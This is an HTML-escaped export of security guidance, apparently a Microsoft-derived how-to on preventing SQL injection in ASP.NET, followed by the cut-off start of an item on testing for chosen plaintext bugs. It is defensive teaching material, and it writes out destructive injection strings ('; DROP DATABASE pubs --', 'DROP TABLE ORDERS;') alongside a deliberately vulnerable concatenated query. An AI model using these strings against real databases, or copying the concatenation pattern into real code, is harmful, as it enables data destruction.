&lt;pre&gt;// Use stored procedures&lt;br&gt;SqlDataAdapter myCommand = new SqlDataAdapter(&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;quot;LoginStoredProcedure '&amp;quot; &amp;#43; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; SSN.Text &amp;#43; &amp;quot;'&amp;quot;, myConnection);&lt;br&gt;&lt;/pre&gt;
&lt;p&gt;The developer's intention was that when the code runs, it inserts the user's input and generates a SQL the following statement.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;SELECT au_lname, au_fname FROM authors WHERE au_id = '172-32-9999'  &lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;However, the code inserts the user's malicious input and generates the following query.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;SELECT au_lname, au_fname FROM authors WHERE au_id = ''; DROP DATABASE pubs --'  &lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;In this case, the &lt;strong&gt;'&lt;/strong&gt; (single quotation mark) character that starts the rogue input terminates the current string literal in the SQL statement. It closes the current statement only if the following parsed token does not make sense as a continuation
 of the current statement but does make sense as the start of a new statement. As a result, the opening single quotation mark character of the rogue input results in the following statement.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;SELECT au_lname, au_fname FROM authors WHERE au_id = ''  &lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;The&lt;strong&gt;;&lt;/strong&gt; (semicolon) character tells SQL that this is the end of the current statement, which is then followed by the following malicious SQL code.&lt;/p&gt;
&lt;div&gt;
&lt;div&gt;
&lt;div&gt;&lt;/div&gt;
&lt;div&gt;&lt;a class="x_copyCode" href=""&gt;&lt;/a&gt;&amp;nbsp;&lt;/div&gt;
&lt;/div&gt;
&lt;pre&gt;; DROP DATABASE pubs  &lt;/pre&gt;
&lt;/div&gt;
&lt;blockquote&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;The semicolon is not necessarily required to separate SQL statements. This is dependent on vendor or implementation, but Microsoft SQL Server does not require them. For example, SQL Server parses the following as two separate
 statements:&lt;/blockquote&gt;
&lt;blockquote&gt;SELECT * FROM MyTable DELETE FROM MyTable&lt;/blockquote&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;p&gt;Finally, the &lt;strong&gt;--&lt;/strong&gt; (double dash) sequence of characters is a SQL comment that tells SQL to ignore the rest of the text. In this case, SQL ignores the closing
&lt;strong&gt;'&lt;/strong&gt; (single quotation mark) character, which would otherwise cause a SQL parser error.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;--'  &lt;/pre&gt;
&lt;/div&gt;
&lt;h2&gt;Guidelines&lt;/h2&gt;
&lt;p&gt;To counter SQL injection attacks, you need to: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Constrain and sanitize input data. &lt;/strong&gt;Check for known good data by validating for type, length, format, and range.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Use type-safe SQL parameters for data access.&lt;/strong&gt; You can use these parameters with stored procedures or dynamically constructed SQL command strings. Parameter collections such as
&lt;strong&gt;SqlParameterCollection&lt;/strong&gt; provide type checking and length validation. If you use a parameters collection, input is treated as a literal value, and SQL Server does not treat it as executable code. An additional benefit of using a parameters collection
 is that you can enforce type and length checks. Values outside of the range trigger an exception. This is a good example of defense in depth.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Use an account that has restricted permissions in the database.&lt;/strong&gt; Ideally, you should only grant execute permissions to selected stored procedures in the database and provide no direct table access.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Avoid disclosing database error information. &lt;/strong&gt;In the event of database errors, make sure you do not disclose detailed error messages to the user.
&lt;/li&gt;&lt;/ul&gt;
&lt;blockquote&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;Conventional security measures, such as the use of Secure Socket Layer (SSL) and IP Security (IPSec), do not protect your application from SQL injection attacks.
&lt;/blockquote&gt;
&lt;h1&gt;Summary of Steps&lt;/h1&gt;
&lt;p&gt;To protect your application from SQL injection, perform the following steps: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Step 1. Constrain input. &lt;/li&gt;&lt;li&gt;Step 2. Use parameters with stored procedures. &lt;/li&gt;&lt;li&gt;Step 3. Use parameters with dynamic SQL.&lt;strong&gt; &lt;/strong&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Step 1. Constrain Input&lt;/h1&gt;
&lt;p&gt;You should validate all input to your ASP.NET applications for type, length, format, and range. By constraining the input used in your data access queries, you can protect your application from SQL injection.
&lt;/p&gt;
&lt;blockquote&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;When constraining input, it is a good practice to create a list of acceptable characters and use regular expressions to reject any characters that are not on the list. The potential risk associated with using a list of unacceptable
 characters is that it is always possible to overlook an unacceptable character when defining the list; also, an unacceptable character can be represented in an alternate format to pass validation.
&lt;/blockquote&gt;
&lt;h2&gt;Constrain Input in ASP.NET Web Pages&lt;/h2&gt;
&lt;p&gt;Start by constraining input in the server-side code for your ASP.NET Web pages. Do not rely on client-side validation because it can be easily bypassed. Use client-side validation only to reduce round trips and to improve the user experience.&lt;/p&gt;
&lt;p&gt;If you use server controls, use the ASP.NET validator controls, such as the &lt;strong&gt;
RegularExpressionValidator&lt;/strong&gt; and &lt;strong&gt;RangeValidator&lt;/strong&gt; controls to constrain input. If you use regular HTML input controls, use the
&lt;strong&gt;Regex&lt;/strong&gt; class in your server-side code to constrain input.&lt;/p&gt;
&lt;p&gt;If in the previous code example, the SSN value is captured by an ASP.NET &lt;strong&gt;
TextBox&lt;/strong&gt; control, you can constrain its input by using a &lt;strong&gt;RegularExpressionValidator&lt;/strong&gt; control as shown in the following.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;&amp;lt;%@ language=&amp;quot;C#&amp;quot; %&amp;gt;&lt;br&gt;&amp;lt;form id=&amp;quot;form1&amp;quot; runat=&amp;quot;server&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;asp:TextBox ID=&amp;quot;SSN&amp;quot; runat=&amp;quot;server&amp;quot;/&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;asp:RegularExpressionValidator ID=&amp;quot;regexpSSN&amp;quot; runat=&amp;quot;server&amp;quot;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ErrorMessage=&amp;quot;Incorrect SSN Number&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ControlToValidate=&amp;quot;SSN&amp;quot;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ValidationExpression=&amp;quot;^\d{3}-\d{2}-\d{4}$&amp;quot; /&amp;gt;&lt;br&gt;&amp;lt;/form&amp;gt;  &lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;If the SSN input is from another source, such as an HTML control, a query string parameter, or a cookie, you can constrain it by using the
&lt;strong&gt;Regex&lt;/strong&gt; class from the &lt;strong&gt;System.Text.RegularExpressions&lt;/strong&gt; namespace. The following example assumes that the input is obtained from a cookie.&lt;/p&gt;
&lt;p&gt;using System.Text.RegularExpressions;&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;if (Regex.IsMatch(Request.Cookies[&amp;quot;SSN&amp;quot;], &amp;quot;^\d{3}-\d{2}-\d{4}$&amp;quot;))&lt;br&gt;{&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // access the database&lt;br&gt;}&lt;br&gt;else&lt;br&gt;{&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // handle the bad input&lt;br&gt;}  &lt;/pre&gt;
&lt;/div&gt;
&lt;h2&gt;Constrain Input in Data Access Code&lt;/h2&gt;
&lt;p&gt;In some situations, you need to provide validation in your data access code, perhaps in addition to your ASP.NET page-level validation. Two common situations where you need to provide validation in your data access code are:
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Untrusted clients.&lt;/strong&gt; If the data can come from an untrusted source or you cannot guarantee how well the data has been validated and constrained, add validation logic that constrains input to your data access routines.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Library code. &lt;/strong&gt;If your data access code is packaged as a library designed for use by multiple applications, your data access code should perform its own validation, because you can make no safe assumptions about the client applications.
&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;The following example shows how a data access routine can validate its input parameters by using regular expressions prior to using the parameters in a SQL statement.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;using System;&lt;br&gt;using System.Text.RegularExpressions;&lt;/pre&gt;
&lt;/div&gt;
&lt;pre&gt;public void CreateNewUserAccount(string name, string password)&lt;br&gt;{&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // Check name contains only lower case or upper case letters, &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // the apostrophe, a dot, or white space. Also check it is &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // between 1 and 40 characters long&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; if ( !Regex.IsMatch(userIDTxt.Text, @&amp;quot;^[a-zA-Z'./s]{1,40}$&amp;quot;))&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; throw new FormatException(&amp;quot;Invalid name format&amp;quot;);&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // Check password contains at least one digit, one lower case &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // letter, one uppercase letter, and is between 8 and 10 &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // characters long&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; if ( !Regex.IsMatch(passwordTxt.Text, &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; @&amp;quot;^(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,10}$&amp;quot; ))&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; throw new FormatException(&amp;quot;Invalid password format&amp;quot;);&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // Perform data access logic (using type safe parameters)&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; ...&lt;br&gt;}&lt;/pre&gt;
&lt;h1&gt;Step 2. Use Parameters with Stored Procedures&lt;/h1&gt;
&lt;p&gt;Using stored procedures does not necessarily prevent SQL injection. The important thing to do is use parameters with stored procedures. If you do not use parameters, your stored procedures can be susceptible to SQL injection if they use unfiltered input
 as described in the &amp;quot;Overview&amp;quot; section of this document.&lt;/p&gt;
&lt;p&gt;The following code shows how to use &lt;strong&gt;SqlParameterCollection&lt;/strong&gt; when calling a stored procedure.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;using System.Data;&lt;br&gt;using System.Data.SqlClient;&lt;/pre&gt;
&lt;pre&gt;using (SqlConnection connection = new SqlConnection(connectionString))&lt;br&gt;{&lt;br&gt;&amp;nbsp; DataSet userDataset = new DataSet();&lt;br&gt;&amp;nbsp; SqlDataAdapter myCommand = new SqlDataAdapter( &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;quot;LoginStoredProcedure&amp;quot;, connection);&lt;br&gt;&amp;nbsp; myCommand.SelectCommand.CommandType = CommandType.StoredProcedure;&lt;br&gt;&amp;nbsp; myCommand.SelectCommand.Parameters.Add(&amp;quot;@au_id&amp;quot;, SqlDbType.VarChar, 11);&lt;br&gt;&amp;nbsp; myCommand.SelectCommand.Parameters[&amp;quot;@au_id&amp;quot;].Value = SSN.Text;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp; myCommand.Fill(userDataset);&lt;br&gt;}  &lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;In this case, the &lt;strong&gt;@au_id&lt;/strong&gt; parameter is treated as a literal value and not as executable code. Also, the parameter is checked for type and length. In the preceding code example, the input value cannot be longer than 11 characters. If the data
 does not conform to the type or length defined by the parameter, the &lt;strong&gt;SqlParameter&lt;/strong&gt; class throws an exception.&lt;/p&gt;
&lt;h2&gt;Review Your Application's Use of Parameterized Stored Procedures&lt;/h2&gt;
&lt;p&gt;Because using stored procedures with parameters does not necessarily prevent SQL injection, you should review your application's use of this type of stored procedure. For example, the following parameterized stored procedure has several security vulnerabilities.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;CREATE PROCEDURE dbo.RunQuery@var ntextAS&lt;br&gt;        exec sp_executesql @varGO  &lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;An application that uses a stored procedure similar to the one in the preceding code example has the following vulnerabilities:
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The stored procedure executes whatever statement is passed to it. Consider the
&lt;strong&gt;@var&lt;/strong&gt; variable being set to:
&lt;div&gt;
&lt;pre&gt;DROP TABLE ORDERS;  &lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;In this case, the ORDERS table will be dropped. &lt;/p&gt;
&lt;/li&gt;&lt;li&gt;The stored procedure runs with &lt;strong&gt;dbo&lt;/strong&gt; privileges. &lt;/li&gt;&lt;li&gt;The stored procedure's name (&lt;strong&gt;RunQuery&lt;/strong&gt;) is a poor choice. If an attacker is able to probe the database, he or she will see the name of the stored procedure. With a name like
&lt;strong&gt;RunQuery&lt;/strong&gt;, he can guess that the stored procedure is likely to run the supplied query.
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Step 3. Use Parameters with Dynamic SQL&lt;/h1&gt;
&lt;p&gt;If you cannot use stored procedures, you should still use parameters when constructing dynamic SQL statements. The following code shows how to use
&lt;strong&gt;SqlParametersCollection&lt;/strong&gt; with dynamic SQL.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;using System.Data;&lt;br&gt;using System.Data.SqlClient;&lt;/pre&gt;
&lt;/div&gt;
&lt;pre&gt;using (SqlConnection connection = new SqlConnection(connectionString))&lt;br&gt;{&lt;br&gt;&amp;nbsp; DataSet userDataset = new DataSet();&lt;br&gt;&amp;nbsp; SqlDataAdapter myDataAdapter = new SqlDataAdapter(&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;quot;SELECT au_lname, au_fname FROM Authors WHERE au_id = @au_id&amp;quot;, &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; connection);&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br&gt;&amp;nbsp; myCommand.SelectCommand.Parameters.Add(&amp;quot;@au_id&amp;quot;, SqlDbType.VarChar, 11);&lt;br&gt;&amp;nbsp; myCommand.SelectCommand.Parameters[&amp;quot;@au_id&amp;quot;].Value = SSN.Text;&lt;br&gt;&amp;nbsp; myDataAdapter.Fill(userDataset);&lt;br&gt;}&lt;/pre&gt;
&lt;h2&gt;Using Parameter Batching&lt;/h2&gt;
&lt;p&gt;A common misconception is that if you concatenate several SQL statements to send a batch of statements to the server in a single round trip, you cannot use parameters. However, you can use this technique if you make sure that parameter names are not repeated.
 You can easily do this by making sure that you use unique parameter names during SQL text concatenation, as shown here.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;using System.Data;&lt;br&gt;using System.Data.SqlClient;&lt;br&gt;. . .&lt;br&gt;using (SqlConnection connection = new SqlConnection(connectionString))&lt;br&gt;{&lt;br&gt;&amp;nbsp; SqlDataAdapter dataAdapter = new SqlDataAdapter(&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;quot;SELECT CustomerID INTO #Temp1 FROM Customers &amp;quot; &amp;#43;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;quot;WHERE CustomerID &amp;gt; @custIDParm; SELECT CompanyName FROM Customers &amp;quot; &amp;#43;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;quot;WHERE Country = @countryParm and CustomerID IN &amp;quot; &amp;#43;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;quot;(SELECT CustomerID FROM #Temp1);&amp;quot;,&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; connection);&lt;br&gt;&amp;nbsp; SqlParameter custIDParm = dataAdapter.SelectCommand.Parameters.Add(&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;quot;@custIDParm&amp;quot;, SqlDbType.NChar, 5);&lt;br&gt;&amp;nbsp; custIDParm.Value = customerID.Text;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp; SqlParameter countryParm = dataAdapter.SelectCommand.Parameters.Add(&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;quot;@countryParm&amp;quot;, SqlDbType.NVarChar, 15);&lt;br&gt;&amp;nbsp; countryParm.Value = country.Text;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp; connection.Open();&lt;br&gt;&amp;nbsp; DataSet dataSet = new DataSet();&lt;br&gt;&amp;nbsp; dataAdapter.Fill(dataSet);&lt;br&gt;}&lt;br&gt;. . .  &lt;/pre&gt;
&lt;/div&gt;
&lt;h1&gt;Additional Considerations&lt;/h1&gt;
&lt;p&gt;Other things to consider when you develop countermeasures to prevent SQL injection include:
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Use escape routines to handle special input characters. &lt;/li&gt;&lt;li&gt;Use a least-privileged database account. &lt;/li&gt;&lt;li&gt;Avoid disclosing error information. &lt;/li&gt;&lt;/ul&gt;
&lt;h2&gt;Use Escape Routines to Handle Special Input Characters&lt;/h2&gt;
&lt;p&gt;In situations where parameterized SQL cannot be used and you are forced to use dynamic SQL instead, you need to safeguard against input characters that have special meaning to SQL Server (such as the single quote character). If not handled, special characters
 such as the single quote character in the input can be utilized to cause SQL injection.
&lt;/p&gt;
&lt;blockquote&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;Special input characters pose a threat only with dynamic SQL and not when using parameterized SQL.
&lt;/blockquote&gt;
&lt;p&gt;Escape routines add an escape character to characters that have special meaning to SQL Server, thereby making them harmless. This is illustrated in the following code fragment:&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;private string SafeSqlLiteral(string inputSQL){  return inputSQL.Replace(&amp;quot;'&amp;quot;, &amp;quot;''&amp;quot;);&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;}&lt;/p&gt;
&lt;h2&gt;Use a Least-Privileged Database Account&lt;/h2&gt;
&lt;p&gt;Your application should connect to the database by using a least-privileged account. If you use Windows authentication to connect, the Windows account should be least-privileged from an operating system perspective and should have limited privileges and
 limited ability to access Windows resources. Additionally, whether or not you use Windows authentication or SQL authentication, the corresponding SQL Server login should be restricted by permissions in the database.&lt;/p&gt;
&lt;p&gt;Consider the example of an ASP.NET application running on Microsoft Windows Server 2003 that accesses a database on a different server in the same domain. By default, the ASP.NET application runs in an application pool that runs under the Network Service
 account. This account is a least privileged account.&lt;/p&gt;
&lt;h3&gt;To access SQL Server with the Network Service account &lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;Create a SQL Server login for the Web server's Network Service account. The Network Service account has network credentials that are presented at the database server as the identity
&lt;em&gt;DOMAIN&lt;/em&gt;\&lt;em&gt;WEBSERVERNAME&lt;/em&gt;$. For example, if your domain is called XYZ and the Web server is called 123, you create a database login for XYZ\123$.
&lt;/li&gt;&lt;li&gt;Grant the new login access to the required database by creating a database user and adding the user to a database role.
&lt;/li&gt;&lt;li&gt;Establish permissions to let this database role call the required stored procedures or access the required tables in the database. Only grant access to stored procedures the application needs to use, and only grant sufficient access to tables based on the
 application's minimum requirements.
&lt;p&gt;For example, if the ASP.NET application only performs database lookups and does not update any data, you only need to grant read access to the tables. This limits the damage that an attacker can cause if the attacker succeeds in a SQL injection attack.
&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h2&gt;Avoid Disclosing Error Information&lt;/h2&gt;
&lt;p&gt;Use structured exception handling to catch errors and prevent them from propagating back to the client. Log detailed error information locally, but return limited error details to the client.
&lt;/p&gt;
&lt;p&gt;If errors occur while the user is connecting to the database, be sure that you provide only limited information about the nature of the error to the user. If you disclose information related to data access and database errors, you could provide a malicious
 user with useful information that he or she can use to compromise your database security. Attackers use the information in detailed error messages to help deconstruct a SQL query that they are trying to inject with malicious code. A detailed error message
 may reveal valuable information such as the connection string, SQL server name, or table and database naming conventions.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>ee32405c-c256-4003-a4a1-d390369d4609</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>How to Test for Chosen Plaintext Bugs</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Cryptography</category>
    <phase>Test</phase>
    <rule_Type>How To</rule_Type>
    <priority />
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Public and private key encryption algorithms&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Summary&lt;/h1&gt;
&lt;p&gt;The adversary's ideal goal when attacking cryptographic systems is to recover the cryptographic key or to decipher specific encrypted information.&amp;nbsp;In the ideal case, a remote adversary can only sniff the encrypted packets; they can';t manipulate either the
 text before encryption (plaintext) or the text after encryption (ciphertext).&amp;nbsp;A chosen plaintext bug allows adversaries to choose any particular plaintext they want. The adversary tricks the victim in to encrypting their own plaintext (&lt;em&gt;P&lt;/em&gt;) and gathers
 useful information from the resulting ciphertext (&lt;em&gt;C&lt;/em&gt;).&amp;nbsp; &amp;nbsp;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;The following steps are recommended to test for chosen plaintext bugs:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Step 1:&amp;nbsp; Understand Attack Scenarios &lt;/li&gt;&lt;li&gt;Step 2:&amp;nbsp; Analyze Root Causes and Mitigations &lt;/li&gt;&lt;li&gt;Step 3:&amp;nbsp; Start Testing and Exploring &lt;/li&gt;&lt;li&gt;Step 4:&amp;nbsp; Tune Test Cases&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Step 1:&amp;nbsp; Understand Attack Scenarios&lt;/h1&gt;
&lt;p&gt;First, you need to understand the details of chosen plaintext attacks. The basic concept of a chosen plaintext attack is really simple: an attacker chooses
&lt;em&gt;plaintext&lt;/em&gt; to feed the encryption algorithm they want to break.&amp;nbsp;There are two scenarios associated with this kind of bug:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Scenario 1:&amp;nbsp; Batched or offline chosen plaintext attack &lt;/li&gt;&lt;li&gt;Scenario 2:&amp;nbsp; Adaptive or online chosen plaintext attack&amp;nbsp;&amp;nbsp; &lt;/li&gt;&lt;/ul&gt;
&lt;h2&gt;Scenario 1:&amp;nbsp; Batched or offline chosen plaintext attack&lt;/h2&gt;
&lt;p&gt;In the batched scenario, the attacker possesses all of the plaintext beforehand (prior to launching the attack and obtaining any ciphertext).&amp;nbsp;The attacker then encrypts the plaintext with the encryption system in question, finally obtaining the corresponding
 ciphertext.&amp;nbsp;This attack is commonly used in attempting to brute-force the private key of the encryption system.&amp;nbsp;&lt;/p&gt;
&lt;h2&gt;Scenario 2:&amp;nbsp; Adaptive or online chosen plaintext attack&lt;/h2&gt;
&lt;p&gt;In an online chosen plaintext attack, the attacker starts by reading one or more plaintext blocks and their corresponding ciphertext.&amp;nbsp;The attacker then generates new plaintext blocks based on information from previous sniffed packets.&amp;nbsp;The attacker then forces
